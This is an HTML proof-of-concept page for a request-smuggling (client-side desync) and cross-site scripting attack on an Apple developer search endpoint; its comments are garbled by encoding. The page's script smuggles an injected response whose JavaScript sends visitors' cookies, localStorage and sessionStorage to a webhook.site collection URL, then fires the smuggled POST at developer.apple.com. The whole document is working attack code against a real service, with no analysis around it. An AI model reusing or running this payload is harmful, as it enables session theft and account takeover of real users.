<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Apple CSD XSS PoC</title>
</head>
<body>
  <h1 style="color: red;">ğŸ Apple CSD + XSS Exploit â€” PoC</h1>
  <p>If you see no popup, open developer tools and monitor the network + Webhook logs.</p>

  <script>
    // Ø¨ÙŠØ§Ù†Ø§Øª Ø³ÙŠØªÙ… ØªÙ‡Ø±ÙŠØ¨Ù‡Ø§ Ø¥Ù„Ù‰ Apple Ø¹Ø¨Ø± CSD
    const smuggled = "\r\n\r\n" +
      "HTTP/1.1 200 OK\r\n" +
      "Content-Type: text/html\r\n" +
      "Content-Length: 500\r\n\r\n" +
      `<script>
        fetch('https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b', {
          method: 'POST',
          body: JSON.stringify({
            cookie: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            userAgent: navigator.userAgent
          })
        });
        alert("âœ… Apple XSS Triggered!");
      <\/script>`;

    // Ø§Ù„Ø·Ù„Ø¨ POST Ø§Ù„Ù…Ù‡Ø±Ø¨ Ø¥Ù„Ù‰ Apple
    fetch("https://developer.apple.com/search/services/v1/quick-links/", {
      method: "POST",
      mode: "no-cors", // Ù†ØªØ¬Ø§ÙˆØ² Ø§Ù„Ù‚ÙŠÙˆØ¯ Ù…Ø¤Ù‚ØªÙ‹Ø§ Ù„Ù„ØªÙ‡Ø±ÙŠØ¨
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "q=aaa" + smuggled
    });
  </script>
</body>
</html>
